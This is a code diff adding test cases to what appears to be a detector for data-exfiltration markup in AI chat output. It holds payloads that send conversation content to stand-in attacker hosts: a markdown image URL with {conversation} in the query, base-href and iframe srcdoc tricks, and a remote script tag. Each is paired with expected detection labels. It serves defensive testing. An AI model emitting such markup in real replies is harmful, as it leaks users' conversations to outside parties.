@@ -635,6 +635,26 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
             ),
             ["exfiltration_query"],
         ),
+        (
+            (
+                "<base href='https://collector.test/?q={c}'>"
+                "<iframe srcdoc='&lt;base href=&quot;https://safe.test:999999/&quot;&gt;"
+                "&lt;a href=&quot;&quot;&gt;x&lt;/a&gt;'></iframe>"
+            ),
+            ["exfiltration_query"],
+        ),
+        (
+            (
+                "<base href='https://collector.test/?q={c}'>"
+                "<iframe srcdoc='&lt;base href=&quot;https://safe.test:ab/&quot;&gt;"
+                "&lt;a href=&quot;&quot;&gt;x&lt;/a&gt;'></iframe>"
+            ),
+            ["exfiltration_query"],
+        ),
+        ("<script type='text/javascript;charset=utf-8' src='https://collector.test/{c}.js'></script>", []),
+        ("[logo](data:image/png;base64,iVBORw0KGgo=)", []),
+        ("<a href='data:image/gif;base64,R0lGOD'>x</a>", []),
+        ("[x](data:image/svg+xml;base64,PHN2Zz4=)", ["data_uri"]),
         ("<base href='https:///'><img src='https://a.test/a.png'>", []),
         (
             (
